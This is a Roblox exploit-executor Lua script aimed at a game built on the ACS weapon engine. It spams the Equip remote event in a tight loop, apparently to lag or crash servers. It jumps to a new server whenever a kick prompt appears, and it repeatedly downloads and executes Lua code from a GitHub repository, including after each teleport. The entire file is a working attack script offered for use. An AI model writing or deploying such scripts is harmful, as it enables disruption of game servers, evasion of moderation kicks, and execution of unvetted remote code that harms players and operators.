repeat
    task.wait()
until game:IsLoaded()

local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local httprequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request

local RemoteEvents = ReplicatedStorage:WaitForChild("RemoteEvents")
local player = Players.LocalPlayer
repeat
    task.wait()
until player.Character and player.Character:FindFirstChild("HumanoidRootPart")

RemoteEvents.CutsceneTerminou:FireServer()
task.wait(.2)
ReplicatedStorage.EscolherTime:FireServer("Segundo")
task.wait(0.2)

player.OnTeleport:Connect(function(state)
    if state == Enum.TeleportState.Started then
        queue_on_teleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/nowkyyl/ignore/refs/heads/main/init.luau'))()")
    end
end)

local tool
repeat
    tool = player:FindFirstChild("Backpack"):FindFirstChild("AR-15")
    task.wait()
until tool

local placeId = game.PlaceId
local jobId = game.JobId
local function GetServers()
    local success, result = pcall(function()
        local req = httprequest({
            Url = ("https://games.roblox.com/v1/games/%s/servers/Public?sortOrder=Desc&limit=100"):format(placeId)
        })
        return HttpService:JSONDecode(req.Body)
    end)

    if not success or not result or not result.data then
        return {}
    end

    local servers = {}
    for i, v in result.data do
        if type(v) ~= "table" then
            continue
        end

        if v.id == jobId then
            continue
        end

        if v.playing >= v.maxPlayers then
            continue
        end

        table.insert(servers, v.id)
    end
    return servers
end

local function Teleport()
    while true do
        local servers = GetServers()
        if #servers > 0 then
            local serverId = servers[math.random(1, #servers)]
            local ok = pcall(TeleportService.TeleportToPlaceInstance, TeleportService, placeId, serverId, player)
            if ok then
                break
            end
        end

        task.wait(2)
    end
end

local kickOverlay = CoreGui:WaitForChild("RobloxPromptGui"):WaitForChild("promptOverlay")
kickOverlay.DescendantAdded:Connect(function(child)
    if child.Name ~= "ErrorTitle" then
        return
    end

    task.spawn(Teleport)
end)

local character = player.Character or player.CharacterAdded:Wait()
local tool = player:WaitForChild("Backpack"):WaitForChild("AR-15")
character.ChildAdded:Connect(function(child)
    if child.Name == "S"..tool.Name then
        child:Destroy()
    end
end)

local function _require(name)
    return loadstring(game:HttpGet(`https://raw.githubusercontent.com/nowkyyl/ignore/refs/heads/main/{name}.luau`))()
end

local Settings = _require("settings")
local Animations = _require("animations")
tool.Parent = character

local Events = ReplicatedStorage.ACS_Engine.Events
local Equip = Events.Equip
while true and tool do
    for i = 1, 20 do
        Equip:FireServer(tool, 1, Settings, Animations)
    end

    task.wait(0.1)
end
